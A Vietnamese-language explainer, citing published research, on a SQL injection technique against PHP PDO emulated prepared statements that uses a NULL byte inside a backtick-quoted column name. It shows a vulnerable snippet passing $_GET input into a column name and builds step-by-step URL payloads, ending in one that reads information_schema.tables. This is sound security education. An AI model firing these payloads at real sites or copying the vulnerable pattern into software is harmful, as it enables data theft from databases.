# Đoạn code không an toàn 
[NGUỒN](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/)
```php
// Code này trông an toàn
$col = '`' . str_replace('`', '``', $_GET['col']) . '`';
$stmt = $pdo->prepare("SELECT $col FROM fruit WHERE name = ?");
$stmt->execute([$_GET['name']]);
```
**Vấn đề**: PDO không dùng prepared statement thật của MySQL, mà **tự parse SQL** và escape thủ công!

# Lỗ hổng: NULL byte (`\0`) phá vỡ parser

# Parser PDO hoạt động sao?
```code
Quy tắc: Backtick phải match: `...`
Pattern: `([`][`]|ANYNOEOF\[`])*`
         └─ ANYNOEOF = [\001-\377] (KHÔNG bao gồm \0!)
```
Input: `col=?\0`

```code
Query tạo ra: SELECT `?\0` FROM fruit WHERE name = ?
                      ↑ ↑
                      │ └─ NULL byte
                      └─ Dấu hỏi
```

# Khai thác từng bước
## Bước 1: Inject bound parameter giả
URL: `?col=?%23%00&name=x`
```sql
Query PDO thấy: SELECT `?#\0` FROM ... WHERE name = ?
                        ↑                          ↑
                        Param 1 (giả)        Param 2 (thật)
```
Result:  
```sql
SELECT `'x'#\0` FROM ... 
```
## Bước 2: Escape backtick và kết thúc query
URL
```code
?col=?%23%00&name=x`;%23
```
```sql
Result: SELECT `'x`;#'#\0` FROM ...
              └───┘
                │
        Thoát khỏi backtick! ✓
```

Tương đương: 
```sql
SELECT `'x`; (câu lệnh mới!)
```
## Bước 3: Tạo tên cột khớp với `\'x`

**Vấn đề**: PDO vẫn nghĩ đang trong string nên escape `'` → `\'`

**Giải pháp**: Thêm `\` trước `?` để tạo tên cột `\'x`

URL:
```url
?col=\?%23%00&name=x` FROM (SELECT ... AS `'x`)y;%23
```

```sql
PDO thấy: SELECT `\?#\0` FROM ...
                  ↑
                  Có backslash!
```

```sql
Sau prepare: SELECT `\'x` FROM (SELECT ... AS `\'x`)y;#
                    └──┘                     └──┘
                     │                         │
                Tên cột khớp nhau! ✓
```

## Payload cuối cùng
```sql
?col=\?%23%00
&name=x` FROM (SELECT table_name AS `'x` from information_schema.tables)y;%23
```

